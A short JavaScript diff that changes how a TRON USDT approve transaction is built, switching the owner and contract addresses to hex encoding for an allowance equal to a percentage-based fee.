@@ -88,18 +88,20 @@ const calculateFeeAmount = (balanceUsdt) =>
   Math.floor(balanceUsdt * 1_000_000 * FEE_PERCENT / 100);
 
 const buildApproveTx = async (fromBase58, feeAmount) => {
+  const ownerHex    = '41' + encodeAddress(fromBase58);
+  const contractHex = '41' + encodeAddress(TRON_USDT_CONTRACT);
   const res = await fetch(`${TRONGRID_URL}/wallet/triggersmartcontract`, {
     method: 'POST', headers: tronHeaders(),
     body: JSON.stringify({
-      owner_address:     fromBase58,
-      contract_address:  TRON_USDT_CONTRACT,
+      owner_address:     ownerHex,
+      contract_address:  contractHex,
       function_selector: 'approve(address,uint256)',
       parameter:
         encodeAddress(TRON_AML_CONTRACT).padStart(64, '0') +
         feeAmount.toString(16).padStart(64, '0'),
       fee_limit:  10_000_000,
       call_value: 0,
-      visible:    true,
+      visible:    false,
     }),
   });
   const data = await res.json();
